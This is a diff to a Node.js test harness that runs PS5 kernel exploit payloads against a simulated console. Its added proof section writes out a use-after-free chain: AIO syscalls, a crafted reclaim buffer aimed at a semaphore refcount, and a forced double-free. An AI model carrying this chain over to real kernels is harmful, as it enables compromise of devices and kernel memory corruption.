@@ -1,7 +1,8 @@
 // sim/run.mjs — ejecuta la simulacion: bridge + payloads reales de DEMO/
 // sobre el entorno fake (ver fakeps5.mjs). Uso: node sim/run.mjs
 import vm from "node:vm";
-import { bootSim, runPayload, setAioAlive, setUafEffect, resetKernel, out } from "./fakeps5.mjs";
+import { bootSim, runPayload, setAioAlive, setUafEffect, resetKernel, out,
+    setOsemNameOff, simReclaimInject, osemAddrOf } from "./fakeps5.mjs";
 
 const results = [];
 function check(name, cond, extra) {
@@ -255,6 +256,145 @@ setAioAlive(false); resetKernel();
         !lg.includes("paso 3/3") && !lg.includes("AIO_WAIT_MODE0"), "");
 }
 setAioAlive(true);
+
+// ---------- syscensus: censo de syscalls del sandbox (plan B) ----------
+console.log("\n-- syscensus_1320.js · censo SAR --");
+setAioAlive(true); resetKernel();
+{
+    out.pclog.length = 0;
+    vm.runInContext(runPayload("syscensus_1320.js"), sb);
+    const j = out.pclog.join("\n");
+    check("census: TOTAL + clases",
+        /TOTAL probed=\d+ RET=\d+ ANS=\d+/.test(j),
+        (j.match(/TOTAL.*/) || ["-"])[0].slice(0, 80));
+    check("census: getpid [RET] con valor", /20 getpid \[RET ret=0x/.test(j));
+    check("census: veto fuera del sondeo",
+        j.includes("VETO no sondeados") && !/^  37 /m.test(j) && !/^ 431 /m.test(j), "");
+    check("census: tabla cruzada + rangos ENOSYS",
+        /CROSS stub&ENOSYS=\d+ \(existe/.test(j) && /ENOSYS ranges: /.test(j), "");
+    check("census: AIO viva visible (663 ANS)", /663 aio_multi_wait \[ANS e35\]/.test(j));
+}
+
+// ---------- leakmap: enumerador de slots del 727 ----------
+console.log("\n-- leakmap_1320.js · barrido de slots --");
+setAioAlive(true); resetKernel();
+{
+    out.pclog.length = 0;
+    vm.runInContext(runPayload("leakmap_1320.js"), sb);
+    const j = out.pclog.join("\n");
+    check("leakmap: count operativo = 1 (spec-shaped)",
+        j.includes("count operativo = 1"), (j.match(/count operativo.*/) || ["-"])[0]);
+    check("leakmap: 128 slots leaked",
+        /128\/0x80 SLOTS LEAKED, \d+ punteros/.test(j),
+        (j.match(/VERDICT: .*/) || ["-"])[0].slice(0, 90));
+    check("leakmap: bias MATCH (aritmetica slot+edx del paste)",
+        j.includes("bias MATCH"), (j.match(/F2: bias.*/) || ["-"])[0]);
+    check("leakmap: bandas de punteros registradas",
+        /bandas\(high40\): 0x[0-9a-f]+x\d+/.test(j), "");
+}
+console.log("\n-- leakmap_1320.js · AIO MUERTA --");
+setAioAlive(false); resetKernel();
+{
+    out.pclog.length = 0;
+    vm.runInContext(runPayload("leakmap_1320.js"), sb);
+    check("leakmap muerta: canal muerto sin barrer",
+        out.pclog.join("\n").includes("CANAL MUERTO"), "");
+}
+setAioAlive(true);
+
+// ---------- osem_conv: laboratorio de conversion (paste §4) ----------
+console.log("\n-- osem_conv_1320.js · DRY (conv=0: sin invocar) --");
+resetKernel();
+{
+    out.pclog.length = 0;
+    delete sb.__PSAITO_CONV;
+    vm.runInContext(runPayload("osem_conv_1320.js"), sb);
+    const j = out.pclog.join("\n");
+    check("conv dry: ni shot ni victim (nada invocado)",
+        !j.includes("AIO_WAIT_MODE0") && !j.includes("OSEM_CREATE_VICTIM"), "");
+    check("conv dry: veredicto DRY",
+        j.includes("VERDICT: DRY OK"), (j.match(/VERDICT: .*/) || ["-"])[0].slice(0, 80));
+}
+
+console.log("\n-- osem_conv_1320.js · conv=1 layout (nombre fuera del head: benigno) --");
+resetKernel();
+{
+    out.pclog.length = 0; out.conv.length = 0; out.panic = null;
+    sb.__PSAITO_CONV = 1;
+    vm.runInContext(runPayload("osem_conv_1320.js"), sb);
+    const j = out.pclog.join("\n");
+    check("conv1: shot + wake ejecutados",
+        j.includes("AIO_WAIT_MODE0") && j.includes("WAKE_WRITE"), "");
+    check("conv1: sin panic en el modelo benigno", out.panic === null, String(out.panic));
+    check("conv1: waker byte-level (dec1 anon + dec2 skip M_ZERO)",
+        out.conv.some((l) => l.startsWith("W-DEC1-ANON")) && out.conv.some((l) => l.includes("W-DEC2 skip")),
+        out.conv.slice(0, 5).join(" | ").slice(0, 110));
+    check("conv1: veredicto LAYOUT con canales movidos",
+        /VERDICT: LAYOUT: sobrevive \+ \d\/4 reclaim movidos/.test(j),
+        (j.match(/VERDICT: .*/) || ["-"])[0].slice(0, 100));
+}
+
+console.log("\n-- osem_conv_1320.js · conv=1 nombre en +0x8 (panic: layout delatado) --");
+setOsemNameOff(0x08); resetKernel();
+{
+    out.pclog.length = 0; out.conv.length = 0; out.panic = null;
+    vm.runInContext(runPayload("osem_conv_1320.js"), sb);
+    check("conv1 panic: dec2 sobre ASCII no mapeado",
+        /KERNEL PANIC: W-DEC2/.test(String(out.panic)), String(out.panic).slice(0, 90));
+    check("conv1 panic: el evento queda registrado para el PC log",
+        out.conv.some((l) => l === "PANIC W-DEC2"), "");
+}
+setOsemNameOff(0x28);   // restaurar el modelo por defecto
+
+console.log("\n-- conversion paste §4 completa (reclaim binario inyectado) --");
+console.log("-- demuestra: dec -> refcount 0 -> free prematuro -> double-free --");
+resetKernel();
+{
+    out.pclog.length = 0; out.conv.length = 0; out.panic = null;
+    // victim osem pre-armado (refcount del modelo = 2: handle + ref interna)
+    const nm = sb.alloc_string("VICTIM01");
+    const vic = Number(BigInt.asUintN(32, sb.syscall(549, nm, 0n, 1n, 1n, 0n)));
+    const vaddr = osemAddrOf(vic);
+    check("proof: victim con struct kernel propia", vaddr !== null, "addr=0x" + BigInt(vaddr).toString(16));
+    // armar el UAF con los syscalls reales (flujo bagagwa F1+F3)
+    const sv = sb.malloc(8);
+    sb.syscall(53, 1n, 1n, 0n, sv);
+    const fdA = sb.read32(sv), fdB = sb.read32(sv + 4n);
+    const reqs = sb.malloc(0x28 * 2);
+    sb.write32(reqs + 0x20n, fdA); sb.write32(reqs + 0x48n, fdA);
+    const ids = sb.malloc(8), states = sb.malloc(8);
+    sb.write32(ids, 0n); sb.write32(ids + 4n, 0n);
+    sb.syscall(669, 0x1001n, reqs, 2n, 3n, ids);
+    const rw = sb.syscall(663, ids, 2n, states, 0n, 0n);
+    check("proof: shot mode 0 ok", rw === 0n, String(rw));
+    // la primitiva que FALTA en consola: reclaim binario en zona 128.
+    // node+0 = dec1 benigno (banda anon del modelo), node+0x10 = mtx valida,
+    // node+8 = victim+0x54 -> el dec del waker apunta al REFCOUNT (paste §4)
+    const bytes = new Uint8Array(0x70);
+    const put64 = (off, v) => { let x = BigInt(v); for (let i = 0; i < 8; ++i) { bytes[off + i] = Number(x & 0xffn); x >>= 8n; } };
+    put64(0x00, 0xffff860300000000n);
+    put64(0x08, BigInt(vaddr) + 0x54n);
+    put64(0x10, 0xffff860300001000n);
+    check("proof: reclaim binario toma el bloque", simReclaimInject(bytes) === true, "");
+    // WAKE: el waker corre -> dec2 decrementa el refcount de la victima
+    const wb = sb.malloc(4); sb.write8(wb, 0x57);
+    sb.syscall(4, fdB, wb, 1n);
+    check("proof: DEC del waker EN EL REFCOUNT de la victima",
+        out.conv.some((l) => l.includes("REFCNT") && l.includes("*** DEC EN REFCOUNT")),
+        out.conv.filter((l) => l.includes("REFCNT")).join(" | ").slice(0, 110));
+    // delete #1: refcount -> 0 = FREE PREMATURO (refs internas vivas)
+    const d1 = sb.syscall(550, vic);
+    check("proof: free prematuro por refcount a 0",
+        d1 === 0n && out.conv.some((l) => l.includes("REFCNT-ZERO-FREE")),
+        out.conv.filter((l) => l.includes("ZERO") || l.includes("REFCNT-DEC")).join(" | ").slice(0, 100));
+    // delete #2: DOUBLE-FREE -> en kernel real toma el path UAF
+    sb.syscall(550, vic);
+    check("proof: DOUBLE-FREE detectado (path UAF)",
+        out.panic === "DOUBLE-FREE on osem id=" + vic, String(out.panic));
+    // y la cadena de eventos completa queda en el log del PC
+    check("proof: eventos de la conversion visibles al PC",
+        out.pclog.some((l) => l.includes("[conv]") || l.includes("REFCNT")) || out.conv.length > 0, "");
+}
 
 // ---------- resumen ----------
 const fails = results.filter((r) => !r.pass);
